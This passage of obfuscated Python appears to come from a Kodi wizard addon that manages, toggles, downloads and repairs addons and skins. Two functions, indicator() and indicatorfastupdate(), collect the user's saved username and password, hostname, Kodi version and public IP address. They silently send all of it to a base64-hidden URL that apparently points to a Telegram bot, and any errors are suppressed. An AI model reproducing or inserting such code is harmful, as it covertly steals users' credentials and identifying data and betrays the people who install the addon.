		for OO0O00OOOOOOOO0OO in sorted (OOO0O00OOOOO0OOOO ,key =lambda O0OO00OO0OOO000OO :O0OO00OO0OOO000OO ):#line:3724
			O0OOOOOO00O0O0OOO =OO0O00OOOOOOOO0OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3725
			O0OO0O0000O0OOOOO =os .path .join (OO0O00OOOOOOOO0OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3726
			OOOO00O0OOOO0000O =os .path .join (OO0O00OOOOOOOO0OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3727
			OO00O0O0O000O0O0O =O0OOOOOO00O0O0OOO #line:3728
			OOO0OOO000O0OOO00 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3729
			for O000OO0OOO0O000O0 in OOO0OOO000O0OOO00 :#line:3730
				OO00O0O0O000O0O0O =OO00O0O0O000O0O0O .replace (O000OO0OOO0O000O0 ,OOO0OOO000O0OOO00 [O000OO0OOO0O000O0 ])#line:3731
			if O0OOOOOO00O0O0OOO in EXCLUDES :OO00O0O0O000O0O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO00O0O0O000O0O0O #line:3732
			else :OO00O0O0O000O0O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO00O0O0O000O0O0O #line:3733
			addFile (' %s'%OO00O0O0O000O0O0O ,'removedata',O0OOOOOO00O0O0OOO ,icon =O0OO0O0000O0OOOOO ,fanart =OOOO00O0OOOO0000O ,themeit =THEME2 )#line:3734
	else :#line:3735
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3736
	setView ('files','viewType')#line:3737
def enableAddons ():#line:3739
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3740
	OO00OO0OO0OOO0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3741
	OO00OOOOOOOO00OOO =0 #line:3742
	for OOOOOOO0OOO0000OO in sorted (OO00OO0OO0OOO0O0O ,key =lambda O0OOOOOOO0O0O00O0 :O0OOOOOOO0O0O00O0 ):#line:3743
		O0OO000O000O00O00 =os .path .split (OOOOOOO0OOO0000OO [:-1 ])[1 ]#line:3744
		if O0OO000O000O00O00 in EXCLUDES :continue #line:3745
		if O0OO000O000O00O00 in DEFAULTPLUGINS :continue #line:3746
		O0000O0O000OO00O0 =os .path .join (OOOOOOO0OOO0000OO ,'addon.xml')#line:3747
		if os .path .exists (O0000O0O000OO00O0 ):#line:3748
			OO00OOOOOOOO00OOO +=1 #line:3749
			OO00OO0OO0OOO0O0O =OOOOOOO0OOO0000OO .replace (ADDONS ,'')[1 :-1 ]#line:3750
			OOOO00O0OOOOO0OO0 =open (O0000O0O000OO00O0 )#line:3751
			OOO0000O00O00OOOO =OOOO00O0OOOOO0OO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3752
			O00000OO00OO0OO00 =wiz .parseDOM (OOO0000O00O00OOOO ,'addon',ret ='id')#line:3753
			OOOOO0OO0O0O00O00 =wiz .parseDOM (OOO0000O00O00OOOO ,'addon',ret ='name')#line:3754
			try :#line:3755
				OOOOOO0OO0O0OO00O =O00000OO00OO0OO00 [0 ]#line:3756
				O0O00O0O0O000OOOO =OOOOO0OO0O0O00O00 [0 ]#line:3757
			except :#line:3758
				continue #line:3759
			try :#line:3760
				O0O00O0O0O0OO00OO =xbmcaddon .Addon (id =OOOOOO0OO0O0OO00O )#line:3761
				O0OOOO00OOO0O0O0O ="[COLOR green][Enabled][/COLOR]"#line:3762
				O00000OO00OO0OOO0 ="false"#line:3763
			except :#line:3764
				O0OOOO00OOO0O0O0O ="[COLOR red][Disabled][/COLOR]"#line:3765
				O00000OO00OO0OOO0 ="true"#line:3766
				pass #line:3767
			O00OO00O0O0000000 =os .path .join (OOOOOOO0OOO0000OO ,'icon.png')if os .path .exists (os .path .join (OOOOOOO0OOO0000OO ,'icon.png'))else ICON #line:3768
			OO000OO00O0OO0OOO =os .path .join (OOOOOOO0OOO0000OO ,'fanart.jpg')if os .path .exists (os .path .join (OOOOOOO0OOO0000OO ,'fanart.jpg'))else FANART #line:3769
			addFile ("%s %s"%(O0OOOO00OOO0O0O0O ,O0O00O0O0O000OOOO ),'toggleaddon',OO00OO0OO0OOO0O0O ,O00000OO00OO0OOO0 ,icon =O00OO00O0O0000000 ,fanart =OO000OO00O0OO0OOO )#line:3770
			OOOO00O0OOOOO0OO0 .close ()#line:3771
	if OO00OOOOOOOO00OOO ==0 :#line:3772
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3773
	setView ('files','viewType')#line:3774
def changeFeq ():#line:3776
	OOOOOOO00O0000000 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3777
	OOOO00000OO0OO00O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOOOOOO00O0000000 )#line:3778
	if not OOOO00000OO0OO00O ==-1 :#line:3779
		wiz .setS ('autocleanfeq',str (OOOO00000OO0OO00O ))#line:3780
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOOOOOO00O0000000 [OOOO00000OO0OO00O ]))#line:3781
def developer ():#line:3783
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3784
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3785
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3786
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3787
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3788
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3789
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3790
	setView ('files','viewType')#line:3792
def download (O00OOO00000000OOO ,OO0OO0OO00O0OO0OO ):#line:3797
  O000000O00OOOO00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3798
  O000O00OO0OO0OOOO =xbmcgui .DialogProgress ()#line:3799
  O000O00OO0OO0OOOO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3800
  O0O0OO0O0O0O00O0O =os .path .join (O000000O00OOOO00O ,'isr.zip')#line:3801
  OO000O00O0O00000O =urllib2 .Request (O00OOO00000000OOO )#line:3802
  OOO0O0O00O00000O0 =urllib2 .urlopen (OO000O00O0O00000O )#line:3803
  O000000OOO0OOOOO0 =xbmcgui .DialogProgress ()#line:3805
  O000000OOO0OOOOO0 .create ("Downloading","Downloading "+name )#line:3806
  O000000OOO0OOOOO0 .update (0 )#line:3807
  OOOOOO0O00OOOOO00 =OO0OO0OO00O0OO0OO #line:3808
  OOO00OO0OOOOO0000 =open (O0O0OO0O0O0O00O0O ,'wb')#line:3809
  try :#line:3811
    OO00O0OOO0O0O0OO0 =OOO0O0O00O00000O0 .info ().getheader ('Content-Length').strip ()#line:3812
    OO00O0000OOO0O0OO =True #line:3813
  except AttributeError :#line:3814
        OO00O0000OOO0O0OO =False #line:3815
  if OO00O0000OOO0O0OO :#line:3817
        OO00O0OOO0O0O0OO0 =int (OO00O0OOO0O0O0OO0 )#line:3818
  OOOOO0OO0000000O0 =0 #line:3820
  O00OO00OOO0O0O0O0 =time .time ()#line:3821
  while True :#line:3822
        O0O000OOOOO0OOOOO =OOO0O0O00O00000O0 .read (8192 )#line:3823
        if not O0O000OOOOO0OOOOO :#line:3824
            sys .stdout .write ('\n')#line:3825
            break #line:3826
        OOOOO0OO0000000O0 +=len (O0O000OOOOO0OOOOO )#line:3828
        OOO00OO0OOOOO0000 .write (O0O000OOOOO0OOOOO )#line:3829
        if not OO00O0000OOO0O0OO :#line:3831
            OO00O0OOO0O0O0OO0 =OOOOO0OO0000000O0 #line:3832
        if O000000OOO0OOOOO0 .iscanceled ():#line:3833
           O000000OOO0OOOOO0 .close ()#line:3834
           try :#line:3835
            os .remove (O0O0OO0O0O0O00O0O )#line:3836
           except :#line:3837
            pass #line:3838
           break #line:3839
        OOO0O0O0OOOOOO0O0 =float (OOOOO0OO0000000O0 )/OO00O0OOO0O0O0OO0 #line:3840
        OOO0O0O0OOOOOO0O0 =round (OOO0O0O0OOOOOO0O0 *100 ,2 )#line:3841
        O0OO0OO000OOO0OOO =OOOOO0OO0000000O0 /(1024 *1024 )#line:3842
        OO0O000OOO00OOO00 =OO00O0OOO0O0O0OO0 /(1024 *1024 )#line:3843
        O0O0OO00O00O0O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0OO000OOO0OOO ,'teal',OO0O000OOO00OOO00 )#line:3844
        if (time .time ()-O00OO00OOO0O0O0O0 )>0 :#line:3845
          OOOOO0OOOO0OOO000 =OOOOO0OO0000000O0 /(time .time ()-O00OO00OOO0O0O0O0 )#line:3846
          OOOOO0OOOO0OOO000 =OOOOO0OOOO0OOO000 /1024 #line:3847
        else :#line:3848
         OOOOO0OOOO0OOO000 =0 #line:3849
        O0O0O0O000OOOOO0O ='KB'#line:3850
        if OOOOO0OOOO0OOO000 >=1024 :#line:3851
           OOOOO0OOOO0OOO000 =OOOOO0OOOO0OOO000 /1024 #line:3852
           O0O0O0O000OOOOO0O ='MB'#line:3853
        if OOOOO0OOOO0OOO000 >0 and not OOO0O0O0OOOOOO0O0 ==100 :#line:3854
            OOO0000OOOO0O0O00 =(OO00O0OOO0O0O0OO0 -OOOOO0OO0000000O0 )/OOOOO0OOOO0OOO000 #line:3855
        else :#line:3856
            OOO0000OOOO0O0O00 =0 #line:3857
        OOO00OOO00OOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO0OOOO0OOO000 ,O0O0O0O000OOOOO0O )#line:3858
        O000000OOO0OOOOO0 .update (int (OOO0O0O0OOOOOO0O0 ),"Downloading "+name ,O0O0OO00O00O0O0OO ,OOO00OOO00OOOO00O )#line:3860
  O0OO0OO0OO00000OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3863
  OOO00OO0OOOOO0000 .close ()#line:3865
  extract (O0O0OO0O0O0O00O0O ,O0OO0OO0OO00000OO ,O000000OOO0OOOOO0 )#line:3867
  if os .path .exists (O0OO0OO0OO00000OO +'/scakemyer-script.quasar.burst'):#line:3868
    if os .path .exists (O0OO0OO0OO00000OO +'/script.quasar.burst'):#line:3869
     shutil .rmtree (O0OO0OO0OO00000OO +'/script.quasar.burst',ignore_errors =False )#line:3870
    os .rename (O0OO0OO0OO00000OO +'/scakemyer-script.quasar.burst',O0OO0OO0OO00000OO +'/script.quasar.burst')#line:3871
  if os .path .exists (O0OO0OO0OO00000OO +'/plugin.video.kmediatorrent-master'):#line:3873
    if os .path .exists (O0OO0OO0OO00000OO +'/plugin.video.kmediatorrent'):#line:3874
     shutil .rmtree (O0OO0OO0OO00000OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3875
    os .rename (O0OO0OO0OO00000OO +'/plugin.video.kmediatorrent-master',O0OO0OO0OO00000OO +'/plugin.video.kmediatorrent')#line:3876
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3877
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3878
  try :#line:3879
    os .remove (O0O0OO0O0O0O00O0O )#line:3880
  except :#line:3881
    pass #line:3882
  O000000OOO0OOOOO0 .close ()#line:3883
def dis_or_enable_addon (OOO0000O000OOO00O ,OOOO00000O0000000 ,enable ="true"):#line:3884
    import json #line:3885
    OO00O0OO0OOOO0OO0 ='"%s"'%OOO0000O000OOO00O #line:3886
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0000O000OOO00O )and enable =="true":#line:3887
        logging .warning ('already Enabled')#line:3888
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO0000O000OOO00O )#line:3889
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0000O000OOO00O )and enable =="false":#line:3890
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO0000O000OOO00O )#line:3891
    else :#line:3892
        OO000OOO0OOOOO00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00O0OO0OOOO0OO0 ,enable )#line:3893
        OO00OOO0O0O0O0OO0 =xbmc .executeJSONRPC (OO000OOO0OOOOO00O )#line:3894
        OO00OOOOOO0O0OOO0 =json .loads (OO00OOO0O0O0O0OO0 )#line:3895
        if enable =="true":#line:3896
            xbmc .log ("### Enabled %s, response = %s"%(OOO0000O000OOO00O ,OO00OOOOOO0O0OOO0 ))#line:3897
        else :#line:3898
            xbmc .log ("### Disabled %s, response = %s"%(OOO0000O000OOO00O ,OO00OOOOOO0O0OOO0 ))#line:3899
    if OOOO00000O0000000 =='auto':#line:3900
     return True #line:3901
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3902
def chunk_report (OO00000000OO00O0O ,OOO0O00OOOOO0000O ,O00O0OOO0OOOO0000 ):#line:3903
   OOOO0OOOO000O0OO0 =float (OO00000000OO00O0O )/O00O0OOO0OOOO0000 #line:3904
   OOOO0OOOO000O0OO0 =round (OOOO0OOOO000O0OO0 *100 ,2 )#line:3905
   if OO00000000OO00O0O >=O00O0OOO0OOOO0000 :#line:3907
      sys .stdout .write ('\n')#line:3908
def chunk_read (OOO0O0OOOOOO0O0O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3910
   import time #line:3911
   OO00OO0OO000OO0OO =int (filesize )*1000000 #line:3912
   O0O0000OO000OOO0O =0 #line:3914
   O0OOO00O0O00OOOO0 =time .time ()#line:3915
   OO00OOOO00O000O0O =0 #line:3916
   logging .warning ('Downloading')#line:3918
   with open (destination ,"wb")as O0O00O0000O00OOOO :#line:3919
    while 1 :#line:3920
      OO0OOOOOO0OOO0OO0 =time .time ()-O0OOO00O0O00OOOO0 #line:3921
      O0OO000O00O0O0O00 =int (OO00OOOO00O000O0O *chunk_size )#line:3922
      O00OOO00OOOO0OO00 =OOO0O0OOOOOO0O0O0 .read (chunk_size )#line:3923
      O0O00O0000O00OOOO .write (O00OOO00OOOO0OO00 )#line:3924
      O0O00O0000O00OOOO .flush ()#line:3925
      O0O0000OO000OOO0O +=len (O00OOO00OOOO0OO00 )#line:3926
      OOO0OO0O000O00000 =float (O0O0000OO000OOO0O )/OO00OO0OO000OO0OO #line:3927
      OOO0OO0O000O00000 =round (OOO0OO0O000O00000 *100 ,2 )#line:3928
      if int (OO0OOOOOO0OOO0OO0 )>0 :#line:3929
        OO0O0OO0O0OO00O00 =int (O0OO000O00O0O0O00 /(1024 *OO0OOOOOO0OOO0OO0 ))#line:3930
      else :#line:3931
         OO0O0OO0O0OO00O00 =0 #line:3932
      if OO0O0OO0O0OO00O00 >1024 and not OOO0OO0O000O00000 ==100 :#line:3933
          O0OO0000000O0O0OO =int (((OO00OO0OO000OO0OO -O0OO000O00O0O0O00 )/1024 )/(OO0O0OO0O0OO00O00 ))#line:3934
      else :#line:3935
          O0OO0000000O0O0OO =0 #line:3936
      if O0OO0000000O0O0OO <0 :#line:3937
        O0OO0000000O0O0OO =0 #line:3938
      dp .update (int (OOO0OO0O000O00000 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0OO0O000O00000 ,O0OO000O00O0O0O00 /(1024 *1024 ),OO00OO0OO000OO0OO /(1000 *1000 ),OO0O0OO0O0OO00O00 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0OO0000000O0O0OO ,60 ))#line:3939
      if dp .iscanceled ():#line:3940
         dp .close ()#line:3941
         break #line:3942
      if not O00OOO00OOOO0OO00 :#line:3943
         break #line:3944
      if report_hook :#line:3946
         report_hook (O0O0000OO000OOO0O ,chunk_size ,OO00OO0OO000OO0OO )#line:3947
      OO00OOOO00O000O0O +=1 #line:3948
   logging .warning ('END Downloading')#line:3949
   return O0O0000OO000OOO0O #line:3950
def googledrive_download (OO00OOOOO00O0OOOO ,OOOO0OOO0O00OOO0O ,OOO000000O0O0O0O0 ,OO00000OO00OO0000 ):#line:3952
    OOOOOOO000OO0OOO0 =[]#line:3956
    OO0O00000OOOOOOOO =OO00OOOOO00O0OOOO .split ('=')#line:3957
    OO00OOOOO00O0OOOO =OO0O00000OOOOOOOO [len (OO0O00000OOOOOOOO )-1 ]#line:3958
    def OO0OO0OO0O0O000O0 (OOO0OOO000OOOO0O0 ):#line:3960
        for O0OOOOOOO00O0O00O in OOO0OOO000OOOO0O0 :#line:3962
            logging .warning ('cookie.name')#line:3963
            logging .warning (O0OOOOOOO00O0O00O .name )#line:3964
            O000O0OOOO0O00OOO =O0OOOOOOO00O0O00O .value #line:3965
            if 'download_warning'in O0OOOOOOO00O0O00O .name :#line:3966
                logging .warning (O0OOOOOOO00O0O00O .value )#line:3967
                logging .warning ('cookie.value')#line:3968
                return O0OOOOOOO00O0O00O .value #line:3969
            return O000O0OOOO0O00OOO #line:3970
        return None #line:3972
    def OOO000O000000O0OO (OO0OOO00OOO000000 ,O0O0OOO00O0OOOO00 ):#line:3974
        O0OOOOO0OOO00O0O0 =32768 #line:3976
        OO0O0OO0OO0OO00O0 =time .time ()#line:3977
        with open (O0O0OOO00O0OOOO00 ,"wb")as O000O0000000OO00O :#line:3979
            O00OOOOOO0OO0000O =1 #line:3980
            O0OO00O00000O0O00 =32768 #line:3981
            try :#line:3982
                O000O0OO0OOO0O0O0 =int (OO0OOO00OOO000000 .headers .get ('content-length'))#line:3983
                print ('file total size :',O000O0OO0OOO0O0O0 )#line:3984
            except TypeError :#line:3985
                print ('using dummy length !!!')#line:3986
                O000O0OO0OOO0O0O0 =int (OO00000OO00OO0000 )*1000000 #line:3987
            for O0OOOOOOO0OOOOOOO in OO0OOO00OOO000000 .iter_content (O0OOOOO0OOO00O0O0 ):#line:3988
                if O0OOOOOOO0OOOOOOO :#line:3989
                    O000O0000000OO00O .write (O0OOOOOOO0OOOOOOO )#line:3990
                    O000O0000000OO00O .flush ()#line:3991
                    OO0OO0OO0OOOO0000 =time .time ()-OO0O0OO0OO0OO00O0 #line:3992
                    O000O00O00OOO0OO0 =int (O00OOOOOO0OO0000O *O0OO00O00000O0O00 )#line:3993
                    if OO0OO0OO0OOOO0000 ==0 :#line:3994
                        OO0OO0OO0OOOO0000 =0.1 #line:3995
                    O0OOOO0OOO00OOO0O =int (O000O00O00OOO0OO0 /(1024 *OO0OO0OO0OOOO0000 ))#line:3996
                    OOOO0O0OO00O0O0OO =int (O00OOOOOO0OO0000O *O0OO00O00000O0O00 *100 /O000O0OO0OOO0O0O0 )#line:3997
                    if O0OOOO0OOO00OOO0O >1024 and not OOOO0O0OO00O0O0OO ==100 :#line:3998
                      OOOOO0O00OO00O00O =int (((O000O0OO0OOO0O0O0 -O000O00O00OOO0OO0 )/1024 )/(O0OOOO0OOO00OOO0O ))#line:3999
                    else :#line:4000
                      OOOOO0O00OO00O00O =0 #line:4001
                    OOO000000O0O0O0O0 .update (int (OOOO0O0OO00O0O0OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOO0O0OO00O0O0OO ,O000O00O00OOO0OO0 /(1024 *1024 ),O000O0OO0OOO0O0O0 /(1000 *1000 ),O0OOOO0OOO00OOO0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOOO0O00OO00O00O ,60 ))#line:4003
                    O00OOOOOO0OO0000O +=1 #line:4004
                    if OOO000000O0O0O0O0 .iscanceled ():#line:4005
                     OOO000000O0O0O0O0 .close ()#line:4006
                     break #line:4007
    O00OOOOOOO0O00OOO ="https://docs.google.com/uc?export=download"#line:4008
    import urllib2 #line:4013
    import cookielib #line:4014
    from cookielib import CookieJar #line:4016
    OO00O000OO00O0OO0 =CookieJar ()#line:4018
    O0O0O00OOO0O0OOO0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO00O000OO00O0OO0 ))#line:4019
    O0000000O00OOO00O ={'id':OO00OOOOO00O0OOOO }#line:4021
    O00OOOO000O0OOOOO =urllib .urlencode (O0000000O00OOO00O )#line:4022
    logging .warning (O00OOOOOOO0O00OOO +'&'+O00OOOO000O0OOOOO )#line:4023
    OO00OO0O00OO0OO0O =O0O0O00OOO0O0OOO0 .open (O00OOOOOOO0O00OOO +'&'+O00OOOO000O0OOOOO )#line:4024
    O0O00O00OOOOO00O0 =OO00OO0O00OO0OO0O .read ()#line:4025
    for OO00O0O0OOOOOO0OO in OO00O000OO00O0OO0 :#line:4027
         logging .warning (OO00O0O0OOOOOO0OO )#line:4028
    O000OOO00OOO0O0O0 =OO0OO0OO0O0O000O0 (OO00O000OO00O0OO0 )#line:4029
    logging .warning (O000OOO00OOO0O0O0 )#line:4030
    if O000OOO00OOO0O0O0 :#line:4031
        O0OOO00O0O00OOOOO ={'id':OO00OOOOO00O0OOOO ,'confirm':O000OOO00OOO0O0O0 }#line:4032
        OO0O0O00O00OO0OO0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:4033
        O00OOOO000O0OOOOO =urllib .urlencode (O0OOO00O0O00OOOOO )#line:4034
        OO00OO0O00OO0OO0O =O0O0O00OOO0O0OOO0 .open (O00OOOOOOO0O00OOO +'&'+O00OOOO000O0OOOOO )#line:4035
        chunk_read (OO00OO0O00OO0OO0O ,report_hook =chunk_report ,dp =OOO000000O0O0O0O0 ,destination =OOOO0OOO0O00OOO0O ,filesize =OO00000OO00OO0000 )#line:4036
    return (OOOOOOO000OO0OOO0 )#line:4040
def kodi17Fix ():#line:4041
	OO0O0OOO0OO0O00OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:4042
	O0OO0OOO0000O0O0O =[]#line:4043
	for OO0OO0OOO0O0O0O0O in sorted (OO0O0OOO0OO0O00OO ,key =lambda O0O0OO00OOOOOO0O0 :O0O0OO00OOOOOO0O0 ):#line:4044
		O0OO000O00OOOO0OO =os .path .join (OO0OO0OOO0O0O0O0O ,'addon.xml')#line:4045
		if os .path .exists (O0OO000O00OOOO0OO ):#line:4046
			OOOOOOO000O000O00 =OO0OO0OOO0O0O0O0O .replace (ADDONS ,'')[1 :-1 ]#line:4047
			OOO0000OOO0O0OOOO =open (O0OO000O00OOOO0OO )#line:4048
			O0OOOO0000OO00000 =OOO0000OOO0O0OOOO .read ()#line:4049
			OO000O0OOO0000OO0 =parseDOM (O0OOOO0000OO00000 ,'addon',ret ='id')#line:4050
			OOO0000OOO0O0OOOO .close ()#line:4051
			try :#line:4052
				O00000OO000OOOO0O =xbmcaddon .Addon (id =OO000O0OOO0000OO0 [0 ])#line:4053
			except :#line:4054
				try :#line:4055
					log ("%s was disabled"%OO000O0OOO0000OO0 [0 ],xbmc .LOGDEBUG )#line:4056
					O0OO0OOO0000O0O0O .append (OO000O0OOO0000OO0 [0 ])#line:4057
				except :#line:4058
					try :#line:4059
						log ("%s was disabled"%OOOOOOO000O000O00 ,xbmc .LOGDEBUG )#line:4060
						O0OO0OOO0000O0O0O .append (OOOOOOO000O000O00 )#line:4061
					except :#line:4062
						if len (OO000O0OOO0000OO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OOOOOOO000O000O00 ,xbmc .LOGERROR )#line:4063
						else :log ("Unabled to enable: %s"%OO0OO0OOO0O0O0O0O ,xbmc .LOGERROR )#line:4064
	if len (O0OO0OOO0000O0O0O )>0 :#line:4065
		O0O000O00O00OO000 =0 #line:4066
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:4067
		for O000OOO0OOOO0OO00 in O0OO0OOO0000O0O0O :#line:4068
			O0O000O00O00OO000 +=1 #line:4069
			OOOO000OOOO0O00OO =int (percentage (O0O000O00O00OO000 ,len (O0OO0OOO0000O0O0O )))#line:4070
			DP .update (OOOO000OOOO0O00OO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OOO0OOOO0OO00 ))#line:4071
			addonDatabase (O000OOO0OOOO0OO00 ,1 )#line:4072
			if DP .iscanceled ():break #line:4073
		if DP .iscanceled ():#line:4074
			DP .close ()#line:4075
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:4076
			sys .exit ()#line:4077
		DP .close ()#line:4078
	forceUpdate ()#line:4079
def indicator ():#line:4081
       try :#line:4082
          import json #line:4083
          wiz .log ('FRESH MESSAGE')#line:4084
          O0OOOOO0000000O00 =(ADDON .getSetting ("user"))#line:4085
          OOO0OOOO000OOOO00 =(ADDON .getSetting ("pass"))#line:4086
          O00OO000OOOO00O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4087
          OOOOOO00OO0000OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEwMjQ1MjM2ODY6QUFFZ0ltWFAxZ081V2J1cHhybzVjbGFuRjN0TklWQ245OGcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTQxNjUyMjk0MCZ0ZXh0PdeU16rXp9eZ158g15DXqiDXlNeR15nXnNeTINep15zXmg=='#line:4088
          OO00O00OO00000O0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4089
          OOOO0O00OO0OO0O0O =str (json .loads (OO00O00OO00000O0O )['ip'])#line:4090
          OOOO0O00OO00O0OOO =O0OOOOO0000000O00 #line:4091
          OOO000000OO0O0OO0 =OOO0OOOO000OOOO00 #line:4092
          import socket #line:4093
          OO00O00OO00000O0O =urllib2 .urlopen (OOOOOO00OO0000OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOO0O00OO00O0OOO +' - '+OOO000000OO0O0OO0 +' - '+O00OO000OOOO00O00 +' - '+OOOO0O00OO0OO0O0O ).readlines ()#line:4094
       except :pass #line:4096
def indicatorfastupdate ():#line:4098
       try :#line:4099
          import json #line:4100
          wiz .log ('FRESH MESSAGE')#line:4101
          OOOOOOO0O000O00O0 =(ADDON .getSetting ("user"))#line:4102
          OO000O00O0OO0OOOO =(ADDON .getSetting ("pass"))#line:4103
          O0O0O0OOO000O0O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4104
          O00OOO0O00OO00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEwMjQ1MjM2ODY6QUFFZ0ltWFAxZ081V2J1cHhybzVjbGFuRjN0TklWQ245OGcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTQxNjUyMjk0MCZ0ZXh0Pdei16nXlCDXoteT15vXldefINee15TXmdeo'#line:4106
          OOO0000OO00OOOO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4107
          O0000OO0OO0OO0OOO =str (json .loads (OOO0000OO00OOOO0O )['ip'])#line:4108
          O0000OOOO00O0O0O0 =OOOOOOO0O000O00O0 #line:4109
          O00OO00O00O0OO000 =OO000O00O0OO0OOOO #line:4110
          import socket #line:4112
          OOO0000OO00OOOO0O =urllib2 .urlopen (O00OOO0O00OO00O00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0000OOOO00O0O0O0 +' - '+O00OO00O00O0OO000 +' - '+O0O0O0OOO000O0O0O +' - '+O0000OO0OO0OO0OOO ).readlines ()#line:4113
       except :pass #line:4115
def skinfix18 ():#line:4117
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:4118
		O0000O0O0O000000O =wiz .workingURL (SKINID18DDONXML )#line:4119
		if O0000O0O0O000000O ==True :#line:4120
			OOO0OO00OOO00OOOO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:4121
			if len (OOO0OO00OOO00OOOO )>0 :#line:4122
				OO000OOO0O00OOO0O ='%s-%s.zip'%(SKINID18 ,OOO0OO00OOO00OOOO [0 ])#line:4123
				O0O0OOOOOO0OOOO0O =wiz .workingURL (SKIN18ZIPURL +OO000OOO0O00OOO0O )#line:4124
				if O0O0OOOOOO0OOOO0O ==True :#line:4125
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4126
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4127
					O000OOOOOO0000OOO =os .path .join (PACKAGES ,OO000OOO0O00OOO0O )#line:4128
					try :os .remove (O000OOOOOO0000OOO )#line:4129
					except :pass #line:4130
					downloader .download (SKIN18ZIPURL +OO000OOO0O00OOO0O ,O000OOOOOO0000OOO ,DP )#line:4131
					extract .all (O000OOOOOO0000OOO ,HOME ,DP )#line:4132
					try :#line:4133
						O0000O00O000OOOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4134
